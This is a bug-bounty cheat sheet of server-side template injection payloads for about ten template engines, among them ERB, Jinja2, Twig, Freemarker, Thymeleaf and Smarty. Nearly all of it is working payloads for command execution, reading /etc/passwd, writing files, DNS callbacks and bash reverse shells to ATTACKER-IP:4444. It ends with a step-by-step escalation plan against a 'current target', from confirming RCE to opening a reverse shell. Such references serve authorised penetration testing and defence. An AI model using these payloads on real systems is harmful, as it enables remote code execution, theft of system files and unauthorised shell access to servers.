# Basic Payloads for Detected
```
{{7*7}}
${7*7}
${{7*7}}
#{7*7}
*{7*7}
@{7*7}
~{7*7}
{{config}}
{{self}}
${.vars}
{{_self.env}}
{$smarty.version}
<%= 7*7 %>
{{7*'7'}}
{7*7}
{{7*7}
${7*7}
```
# 🔥 SSTI Payloads 2026 - Complete Bug Bounty Reference

## Quick Navigation
- [ERB (Ruby) - Most Common](#erb-ruby)
- [Jinja2 (Python)](#jinja2-python)
- [Twig (PHP)](#twig-php)
- [Freemarker (Java)](#freemarker-java)
- [Velocity (Java)](#velocity-java)
- [Smarty (PHP)](#smarty-php)
- [Thymeleaf (Java)](#thymeleaf-java)
- [EL (Expression Language)](#el-expression-language)
- [SpringEL (Spring Framework)](#springel-spring-framework)
- [Blind SSTI Payloads](#blind-ssti-payloads)
- [Time Delay Payloads](#time-delay-payloads)
- [Reverse Shell Payloads](#reverse-shell-payloads)

---

## 📌 How to Use This Guide

1. **First Test:** Try `<%= 7*7 %>` or `{{7*7}}` or `${7*7}`
2. **If math works** → Find your engine below
3. **Use RCE payload** for that engine
4. **If no output** → Use blind payloads with Collaborator

---

## 🔴 ERB (Ruby)

**Detection:** `<%= 7*7 %>` → shows `49`

| Goal | Payload |
|------|---------|
| Command Execution | `<%= system("id") %>` |
| Command Output | `<%= `id` %>` |
| Read File | `<%= File.open('/etc/passwd').read %>` |
| Environment | `<%= ENV['PATH'] %>` |
| Current Directory | `<%= Dir.pwd %>` |
| List Directory | `<%= system("ls -la") %>` |
| Write File | `<%= File.open('/tmp/test.txt','w').write('hacked') %>` |
| DNS Callback | `<%= system("nslookup YOUR-COLLABORATOR.com") %>` |
| Time Delay | `<%= system("sleep 5") %>` |
| Reverse Shell | `<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") %>` |

---
## Tornado (Python)
```
{{7*7}} = 49
${7*7} = ${7*7}
{{foobar}} = Error
{{7*'7'}} = 7777777

{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}
{{os.system('whoami')}}
{{os.system('whoami')}}
{% import os %}{{ os.popen("whoami").read() }}
{% import os %}{{os.system('pwd')

```

## 🟢 Jinja2 (Python)

**Detection:** `{{7*7}}` → shows `49`

| Goal | Payload |
|------|---------|
| Command Execution | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Command Output | `{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}` |
| Read File | `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}` |
| Environment | `{{config.items()}}` |
| Current Directory | `{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}` |
| List Directory | `{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}` |
| Write File | `{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test.txt','w').write('hacked')}}` |
| DNS Callback | `{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR-COLLABORATOR.com').read()}}` |
| Time Delay | `{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}` |
| Reverse Shell | `{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"').read()}}` |

---

## 🟡 Twig (PHP)

**Detection:** `{{7*7}}` → shows `49`

| Goal | Payload |
|------|---------|
| Command Execution | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Command Output | `{{['id']|map('system')}}` |
| Read File | `{{'/etc/passwd'|file_excerpt(1,30)}}` |
| List Directory | `{{['ls -la']|map('system')}}` |
| DNS Callback | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup YOUR-COLLABORATOR.com")}}` |
| Time Delay | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("sleep 5")}}` |

---

## 🟠 Freemarker (Java)

**Detection:** `${7*7}` → shows `49`

| Goal | Payload |
|------|---------|
| Command Execution | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Command Output | `${"freemarker.template.utility.Execute"?new()("whoami")}` |
| Read File | `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}` |
| DNS Callback | `${"freemarker.template.utility.Execute"?new()("nslookup YOUR-COLLABORATOR.com")}` |
| Time Delay | `${"freemarker.template.utility.Execute"?new()("sleep 5")}` |
| Reverse Shell | `<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'")}` |

---

## 🔵 Velocity (Java)

**Detection:** `#set($x=7*7)${x}` → shows `49`

| Goal | Payload |
|------|---------|
| Command Execution | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))` |
| Read File | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("cat /etc/passwd"))` |
| DNS Callback | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("nslookup YOUR-COLLABORATOR.com"))` |
| Time Delay | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("sleep 5"))` |

---

## 🟣 Smarty (PHP)

**Detection:** `{$smarty.now}` → shows timestamp

| Goal | Payload |
|------|---------|
| Command Execution | `{php}system('id');{/php}` |
| Read File | `{php}echo file_get_contents('/etc/passwd');{/php}` |
| DNS Callback | `{php}system('nslookup YOUR-COLLABORATOR.com');{/php}` |
| Time Delay | `{php}sleep(5);{/php}` |
| Reverse Shell | `{php}system('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"');{/php}` |

---

## 🟤 Thymeleaf (Java)

**Detection:** `${7*7}` or `[[${7*7}]]` → shows `49`

| Goal | Payload |
|------|---------|
| Command Execution | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
| Command Output | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` |
| Read File | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}` |
| DNS Callback | `${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}` |
| Time Delay | `${T(java.lang.Runtime).getRuntime().exec('sleep 5')}` |
| Reverse Shell | `${T(java.lang.Runtime).getRuntime().exec('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"')}` |

---

## ⚪ EL (Expression Language)

**Detection:** `${7*7}` → shows `49`

| Goal | Payload |
|------|---------|
| Command Execution | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
| Command Output | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` |
| Read File | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}` |
| DNS Callback | `${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}` |
| Time Delay | `${T(java.lang.Runtime).getRuntime().exec('sleep 5')}` |

---

## ⚫ SpringEL (Spring Framework)

**Detection:** `*{7*7}` → shows `49`

| Goal | Payload |
|------|---------|
| Command Execution | `*{T(java.lang.Runtime).getRuntime().exec('id')}` |
| Command Output | `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` |
| Read File | `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}` |
| DNS Callback | `*{T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}` |
| Time Delay | `*{T(java.lang.Runtime).getRuntime().exec('sleep 5')}` |

---

## 🌐 Blind SSTI Payloads (All Engines)

**Use when no output visible - DNS Callback**

| Engine | Payload |
|--------|---------|
| ERB | `<%= system("nslookup YOUR-COLLABORATOR.com") %>` |
| Jinja2 | `{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR-COLLABORATOR.com').read()}}` |
| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup YOUR-COLLABORATOR.com")}}` |
| Freemarker | `${"freemarker.template.utility.Execute"?new()("nslookup YOUR-COLLABORATOR.com")}` |
| Velocity | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("nslookup YOUR-COLLABORATOR.com"))` |
| Smarty | `{php}system('nslookup YOUR-COLLABORATOR.com');{/php}` |
| Thymeleaf | `${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}` |

---

## ⏱️ Time Delay Payloads (All Engines)

**Use for blind detection - 5 second delay**

| Engine | Payload |
|--------|---------|
| ERB | `<%= system("sleep 5") %>` |
| Jinja2 | `{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}` |
| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("sleep 5")}}` |
| Freemarker | `${"freemarker.template.utility.Execute"?new()("sleep 5")}` |
| Velocity | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("sleep 5"))` |
| Smarty | `{php}sleep(5);{/php}` |
| Thymeleaf | `${T(java.lang.Runtime).getRuntime().exec('sleep 5')}` |

---

## 💀 Reverse Shell Payloads

| Engine | Payload (Replace ATTACKER-IP:4444) |
|--------|-------------------------------------|
| ERB | `<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") %>` |
| Jinja2 | `{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"').read()}}` |
| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'")}}` |
| Freemarker | `${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'")}` |
| Smarty | `{php}system('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"');{/php}` |
| Thymeleaf | `${T(java.lang.Runtime).getRuntime().exec('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"')}` |

---

## 📝 File Read Payloads (All Engines)

| Engine | Payload |
|--------|---------|
| ERB | `<%= File.open('/etc/passwd').read %>` |
| Jinja2 | `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}` |
| Twig | `{{'/etc/passwd'|file_excerpt(1,30)}}` |
| Freemarker | `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}` |
| Smarty | `{php}echo file_get_contents('/etc/passwd');{/php}` |
| Thymeleaf | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}` |

---

## 🚀 Quick Command Reference

| What you want | ERB | Jinja2 | Freemarker |
|---------------|-----|--------|------------|
| `id` | `<%= system("id") %>` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | `${"freemarker.template.utility.Execute"?new()("id")}` |
| `whoami` | `<%= system("whoami") %>` | `{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}` | `${"freemarker.template.utility.Execute"?new()("whoami")}` |
| `cat /etc/passwd` | `<%= File.open('/etc/passwd').read %>` | `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}` | `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}` |
| `ls -la` | `<%= system("ls -la") %>` | `{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}` | `${"freemarker.template.utility.Execute"?new()("ls -la")}` |
| `pwd` | `<%= Dir.pwd %>` | `{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}` | `${"freemarker.template.utility.Execute"?new()("pwd")}` |
| DNS Callback | `<%= system("nslookup COLLAB.com") %>` | `{{config.__class__.__init__.__globals__['os'].popen('nslookup COLLAB.com').read()}}` | `${"freemarker.template.utility.Execute"?new()("nslookup COLLAB.com")}` |
| Sleep 5 | `<%= system("sleep 5") %>` | `{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}` | `${"freemarker.template.utility.Execute"?new()("sleep 5")}` |

---

## ✅ Detection Checklist

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | `<%= 7*7 %>` or `{{7*7}}` or `${7*7}` | `49` in response |
| 2 | `<%= system("id") %>` or equivalent | `uid=` output |
| 3 | `<%= File.open('/etc/passwd').read %>` | File content |
| 4 | `<%= system("nslookup COLLAB.com") %>` | DNS callback |
| 5 | `<%= system("sleep 5") %>` | 5-second delay |

---

## 🎯 Your Current Target (ERB)

Since `<%= 7*7 %>` works, use these next:

```erb
# Step 1 - Confirm RCE
<%= system("id") %>

# Step 2 - Read files
<%= File.open('/etc/passwd').read %>

# Step 3 - Blind callback (if no output)
<%= system("nslookup YOUR-COLLABORATOR.burpcollaborator.net") %>

# Step 4 - Reverse shell
<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") %>
